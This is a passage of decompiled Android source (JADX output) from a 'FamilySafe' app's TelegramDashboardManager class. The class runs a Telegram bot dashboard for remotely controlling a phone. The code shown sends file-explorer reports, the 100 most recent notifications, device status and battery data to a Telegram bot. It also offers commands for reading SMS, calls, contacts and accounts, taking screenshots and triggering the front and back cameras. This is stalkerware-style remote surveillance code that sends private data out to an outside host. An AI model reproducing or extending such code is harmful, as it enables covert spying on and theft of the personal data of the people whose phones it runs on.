    static final class AnonymousClass5 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
        Object L$0;
        int label;

        AnonymousClass5(Continuation<? super AnonymousClass5> continuation) {
            super(2, continuation);
        }

        @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            return TelegramDashboardManager.this.new AnonymousClass5(continuation);
        }

        @Override // kotlin.jvm.functions.Function2
        public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
            return ((AnonymousClass5) create(coroutineScope, continuation)).invokeSuspend(Unit.INSTANCE);
        }

        @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
        public final Object invokeSuspend(Object $result) {
            File file;
            Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
            switch (this.label) {
                case 0:
                    ResultKt.throwOnFailure($result);
                    File file2 = TelegramDashboardManager.this.fileExplorerManager.generateReport();
                    if (file2 != null) {
                        this.L$0 = SpillingKt.nullOutSpilledVariable(file2);
                        this.label = 1;
                        if (TelegramDashboardManager.this.telegramClient.sendDocument(file2, "File Explorer Report", this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        file = file2;
                    }
                    return Unit.INSTANCE;
                case 1:
                    file = (File) this.L$0;
                    ResultKt.throwOnFailure($result);
                    return Unit.INSTANCE;
                default:
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
        }
    }

    /* JADX INFO: renamed from: com.example.data.remote.TelegramDashboardManager$handleCallbackQuery$6, reason: invalid class name */
    /* JADX INFO: compiled from: TelegramDashboardManager.kt */
    @Metadata(d1 = {"\u0000\n\n\u0000\n\u0002\u0010\u0002\n\u0002\u0018\u0002\u0010\u0000\u001a\u00020\u0001*\u00020\u0002H\n"}, d2 = {"<anonymous>", "", "Lkotlinx/coroutines/CoroutineScope;"}, k = 3, mv = {2, 2, 0}, xi = 48)
    @DebugMetadata(c = "com.example.data.remote.TelegramDashboardManager$handleCallbackQuery$6", f = "TelegramDashboardManager.kt", i = {1}, l = {170, 171}, m = "invokeSuspend", n = {"file"}, s = {"L$0"})
    static final class AnonymousClass6 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
        Object L$0;
        int label;

        AnonymousClass6(Continuation<? super AnonymousClass6> continuation) {
            super(2, continuation);
        }

        @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            return TelegramDashboardManager.this.new AnonymousClass6(continuation);
        }

        @Override // kotlin.jvm.functions.Function2
        public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
            return ((AnonymousClass6) create(coroutineScope, continuation)).invokeSuspend(Unit.INSTANCE);
        }

        /* JADX WARN: Removed duplicated region for block: B:13:0x0038  */
        @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
        /*
            Code decompiled incorrectly, please refer to instructions dump.
            To view partially-correct code enable 'Show inconsistent code' option in preferences
        */
        public final java.lang.Object invokeSuspend(java.lang.Object r6) {
            /*
                r5 = this;
                java.lang.Object r0 = kotlin.coroutines.intrinsics.IntrinsicsKt.getCOROUTINE_SUSPENDED()
                int r1 = r5.label
                switch(r1) {
                    case 0: goto L1e;
                    case 1: goto L19;
                    case 2: goto L11;
                    default: goto L9;
                }
            L9:
                java.lang.IllegalStateException r0 = new java.lang.IllegalStateException
                java.lang.String r1 = "call to 'resume' before 'invoke' with coroutine"
                r0.<init>(r1)
                throw r0
            L11:
                java.lang.Object r0 = r5.L$0
                java.io.File r0 = (java.io.File) r0
                kotlin.ResultKt.throwOnFailure(r6)
                goto L54
            L19:
                kotlin.ResultKt.throwOnFailure(r6)
                r1 = r6
                goto L34
            L1e:
                kotlin.ResultKt.throwOnFailure(r6)
                com.example.data.remote.TelegramDashboardManager r1 = com.example.data.remote.TelegramDashboardManager.this
                com.example.managers.NotificationExportManager r1 = com.example.data.remote.TelegramDashboardManager.access$getNotificationExportManager$p(r1)
                r2 = r5
                kotlin.coroutines.Continuation r2 = (kotlin.coroutines.Continuation) r2
                r3 = 1
                r5.label = r3
                java.lang.Object r1 = r1.generateReport(r2)
                if (r1 != r0) goto L34
                return r0
            L34:
                java.io.File r1 = (java.io.File) r1
                if (r1 == 0) goto L55
                com.example.data.remote.TelegramDashboardManager r2 = com.example.data.remote.TelegramDashboardManager.this
                com.example.data.remote.TelegramBotClient r2 = com.example.data.remote.TelegramDashboardManager.access$getTelegramClient$p(r2)
                r3 = r5
                kotlin.coroutines.Continuation r3 = (kotlin.coroutines.Continuation) r3
                java.lang.Object r4 = kotlin.coroutines.jvm.internal.SpillingKt.nullOutSpilledVariable(r1)
                r5.L$0 = r4
                r4 = 2
                r5.label = r4
                java.lang.String r4 = "Recent 100 Notifications"
                java.lang.Object r2 = r2.sendDocument(r1, r4, r3)
                if (r2 != r0) goto L53
                return r0
            L53:
                r0 = r1
            L54:
                r1 = r0
            L55:
                kotlin.Unit r0 = kotlin.Unit.INSTANCE
                return r0
            */
            throw new UnsupportedOperationException("Method not decompiled: com.example.data.remote.TelegramDashboardManager.AnonymousClass6.invokeSuspend(java.lang.Object):java.lang.Object");
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public final Object sendStatus(Continuation<? super Unit> continuation) {
        String msg = "<b>Device Status</b>\nMonitoring: Active\nOS: Android " + Build.VERSION.RELEASE + "\nOEM: " + Build.MANUFACTURER;
        Object objSendMessage$default = TelegramBotClient.sendMessage$default(this.telegramClient, msg, null, continuation, 2, null);
        return objSendMessage$default == IntrinsicsKt.getCOROUTINE_SUSPENDED() ? objSendMessage$default : Unit.INSTANCE;
    }

    /* JADX INFO: Access modifiers changed from: private */
    public final Object sendBatteryInfo(Continuation<? super Unit> continuation) {
        IntentFilter iFilter = new IntentFilter("android.intent.action.BATTERY_CHANGED");
        Intent batteryStatus = this.context.registerReceiver(null, iFilter);
        int level = batteryStatus != null ? batteryStatus.getIntExtra("level", -1) : -1;
        int scale = batteryStatus != null ? batteryStatus.getIntExtra("scale", -1) : -1;
        float batteryPct = (level * 100) / scale;
        Object objSendMessage$default = TelegramBotClient.sendMessage$default(this.telegramClient, "<b>Battery Status</b>\nLevel: " + batteryPct + "%", null, continuation, 2, null);
        return objSendMessage$default == IntrinsicsKt.getCOROUTINE_SUSPENDED() ? objSendMessage$default : Unit.INSTANCE;
    }

    public final Object sendDashboard(Continuation<? super Unit> continuation) {
        Object objSendMessage = this.telegramClient.sendMessage("🛡 <b>FamilySafe Dashboard</b>\nSelect an action below:", MapsKt.mapOf(TuplesKt.to("inline_keyboard", CollectionsKt.listOf((Object[]) new List[]{CollectionsKt.listOf((Object[]) new Map[]{MapsKt.mapOf(TuplesKt.to("text", "📱 Status"), TuplesKt.to("callback_data", "cmd_status")), MapsKt.mapOf(TuplesKt.to("text", "📍 Location"), TuplesKt.to("callback_data", "cmd_ping"))}), CollectionsKt.listOf((Object[]) new Map[]{MapsKt.mapOf(TuplesKt.to("text", "🔋 Battery"), TuplesKt.to("callback_data", "cmd_battery")), MapsKt.mapOf(TuplesKt.to("text", "📊 App Usage"), TuplesKt.to("callback_data", "cmd_usage"))}), CollectionsKt.listOf((Object[]) new Map[]{MapsKt.mapOf(TuplesKt.to("text", "✉️ SMS"), TuplesKt.to("callback_data", "cmd_sms")), MapsKt.mapOf(TuplesKt.to("text", "📞 Calls"), TuplesKt.to("callback_data", "cmd_calls")), MapsKt.mapOf(TuplesKt.to("text", "📇 Contacts"), TuplesKt.to("callback_data", "cmd_contacts"))}), CollectionsKt.listOf((Object[]) new Map[]{MapsKt.mapOf(TuplesKt.to("text", "👤 Accounts"), TuplesKt.to("callback_data", "cmd_accounts")), MapsKt.mapOf(TuplesKt.to("text", "🔊 Ring Device"), TuplesKt.to("callback_data", "cmd_ring"))}), CollectionsKt.listOf((Object[]) new Map[]{MapsKt.mapOf(TuplesKt.to("text", "🔒 Lock Study"), TuplesKt.to("callback_data", "cmd_study_lock")), MapsKt.mapOf(TuplesKt.to("text", "🔓 Unlock"), TuplesKt.to("callback_data", "cmd_study_unlock"))}), CollectionsKt.listOf((Object[]) new Map[]{MapsKt.mapOf(TuplesKt.to("text", "📦 Installed Apps"), TuplesKt.to("callback_data", "cmd_installed")), MapsKt.mapOf(TuplesKt.to("text", "🔔 Notifications"), TuplesKt.to("callback_data", "cmd_notifications"))}), CollectionsKt.listOf((Object[]) new Map[]{MapsKt.mapOf(TuplesKt.to("text", "📁 Files"), TuplesKt.to("callback_data", "cmd_files")), MapsKt.mapOf(TuplesKt.to("text", "🖼 Screenshot"), TuplesKt.to("callback_data", "cmd_screenshot"))}), CollectionsKt.listOf((Object[]) new Map[]{MapsKt.mapOf(TuplesKt.to("text", "📸 Front Cam"), TuplesKt.to("callback_data", "cmd_camera_front")), MapsKt.mapOf(TuplesKt.to("text", "📸 Back Cam"), TuplesKt.to("callback_data", "cmd_camera_back"))}), CollectionsKt.listOf(MapsKt.mapOf(TuplesKt.to("text", "🔄 Refresh State"), TuplesKt.to("callback_data", "cmd_refresh")))}))), continuation);
        return objSendMessage == IntrinsicsKt.getCOROUTINE_SUSPENDED() ? objSendMessage : Unit.INSTANCE;
    }
}
